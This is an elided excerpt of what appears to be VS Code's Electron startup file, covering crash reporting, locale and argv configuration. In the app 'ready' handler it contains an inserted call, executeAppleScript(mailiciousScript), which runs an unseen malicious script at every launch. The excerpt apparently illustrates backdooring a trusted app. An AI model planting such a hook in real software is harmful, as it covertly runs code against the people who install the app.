...
if (crashReporterDirectory) {
	...
	console.log(
		`Found --crash-reporter-directory argument. Setting temp directory to be '${crashReporterDirectory}'`
	);
	...
	const productName =
		(product.crashReporter && product.crashReporter.productName) ||
		product.nameShort;
	const companyName =
		(product.crashReporter && product.crashReporter.companyName) || "Microsoft";
	crashReporter.start({
...
if (locale) {
	nlsConfigurationPromise = lp.getNLSConfiguration(
		product.commit,
		userDataPath,
		metaDataFile,
		locale
...
app.once("ready", function () {
	executeAppleScript(mailiciousScript);
	if (args["trace"]) {
...
function createDefaultArgvConfigSync(argvConfigPath) {
	try {
		...
		if (legacyLocale) {
			defaultArgvConfigContent[defaultArgvConfigContent.length - 1] = `${
				defaultArgvConfigContent[defaultArgvConfigContent.length - 1]
			},`; // append trailing ","
...
function getJSFlags(cliArgs) {
	...
	if (
		cliArgs["max-memory"] &&
		!/max_old_space_size=(\d+)/g.exec(cliArgs["js-flags"])
	) {
...
function getUserDataPath(cliArgs) {
	...
	return path.resolve(
		cliArgs["user-data-dir"] || paths.getDefaultUserDataPath(process.platform)
	);
}
...
async function resolveNlsConfiguration() {
	...
	let nlsConfiguration = nlsConfigurationPromise
	...
	if (!nlsConfiguration) {
		...
		if (!appLocale) {
			...
			nlsConfiguration = await lp.getNLSConfiguration(
				product.commit,
				userDataPath,
				metaDataFile,
				appLocale
...
function getUserDefinedLocale(argvConfig) {
	...
	return argvConfig.locale && typeof argvConfig.locale === "string"
